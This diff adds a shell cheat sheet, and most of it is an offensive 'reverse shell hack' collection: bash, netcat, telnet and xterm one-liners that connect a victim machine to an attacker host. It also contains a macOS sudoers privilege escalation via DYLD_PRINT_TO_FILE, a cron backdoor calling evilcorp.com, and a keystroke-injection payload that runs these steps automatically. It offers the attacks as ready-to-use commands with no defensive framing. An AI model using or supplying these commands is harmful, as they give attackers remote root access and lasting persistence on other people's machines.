@@ -1,0 +1,119 @@
+# deconstructing output from command process
+read bol lp_cpu_load eol <<<"$( LANG=C sysctl -n vm.loadavg )"
+
+# find executables
+find . -perm +111 -type f
+
+# find set stickbit
+find . -perm +1000 -type f
+
+------------------------------------------------------------------------------
+# REVERSE SHELL HACK
+------------------------------------------------------------------------------
+Versions of reverse shell
+------------------------------------------------------------------------------
+# First of all, on your machine, set up a listener, where attackerip is your
+# IP address and 4444 is an arbitrary TCP port unfiltered by the target's firewall:
+# find unfiltered port on victim machine
+attacker$ nc -l -v attackerip 4444
+------------------------------------------------------------------------------
+Below are the reverse shell setups on victim machine
+------------------------------------------------------------------------------
+# bash
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+- or
+exec /bin/bash 0&0 2>&0
+- or
+0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
+- or
+exec 5<>/dev/tcp/attackerip/4444
+cat <&5 | while read line; do $line 2>&5 >&5; done  # or:
+while read line 0<&5; do $line 2>&5 >&5; done
+------------------------------------------------------------------------------
+# netcat
+nc -e /bin/sh 10.0.0.1 1234
+- or
+nc -c /bin/sh attackerip 4444
+- or
+/bin/sh | nc attackerip 4444
+- or
+rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p
+- or: fifo & netcat (older version)
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 >/tmp/f
+------------------------------------------------------------------------------
+# telnet
+rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
+- or
+telnet attackerip 4444 | /bin/bash | telnet attackerip 4445
+# Remember to listen on your machine also on port 4445/tcp
+------------------------------------------------------------------------------
+# xterm
+xterm -display 10.0.0.1:1
+------------------------------------------------------------------------------
+------------------------------------------------------------------------------
+# Basics
+# <victim machine>
+# setup TCP pipe bi-directional connect to google
+sudo cat < /dev/tcp/www.google.com/80 0>&1
+# send an HTTP request to device 3
+echo -e "GET / HTTP/1.1\n\n">&3
+# read response
+cat <&3 [/code]
+# Reverse Shell setup
+# <target machine>
+$ /bin/bash -i > /dev/tcp/192.168.1.133/8080 0<&1 2>&1
+------------------------------------------------------------------------------
+# access the reverse shell
+<attacker machine>
+$ nc -n -vv -l -p 8080
+----------
+listening on [any] 8080
+connect to [192.168.1.133] from (UNKOWN) [192.168.1.133] 32949
+----------
+id
+---------
+uid=0(root0)
+---------
+
+------------------------------------------------------------------------------
+Reverse Shell #2
+------------------------------------------------------------------------------
+# escalate privileges
+echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo -s
+# reverse shell
+(crontab -l ; echo "* * * * * bash -i >& /dev/tcp/evilcorp.com/443 0>&1")| crontab -
+# reset privileges
+echo -e '$d\nw\nq'| ed /etc/sudoers
+
+# access the reverse shell backdoor
+sudo nc -l -p 443
+
+# original payload
+------------------------------------------------------------------------------
+DELAY 2000
+REM --------------- OPEN TERMINAL IN A NEW WINDOW ---------------
+COMMAND SPACE
+DELAY 300
+STRING Terminal
+DELAY 300
+ENTER
+DELAY 700
+COMMAND n
+DELAY 500
+REM --------------- ESCALATE PRIVILEGES ---------------
+STRING echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo -s
+ENTER
+DELAY 200
+REM --------------- RUN PAYLOAD ---------------
+STRING (crontab -l ; echo "* * * * * bash -i >& /dev/tcp/evilcorp.com/443 0>&1")| crontab -
+ENTER
+DELAY 200
+REM --------------- SET PRIVILEGES BACK TO NORMAL ---------------
+STRING echo -e '$d\nw\nq'| ed /etc/sudoers
+ENTER
+DELAY 200
+REM --------------- CLOSE TERMINAL ---------------
+STRING exit
+ENTER
+COMMAND Q
+------------------------------------------------------------------------------
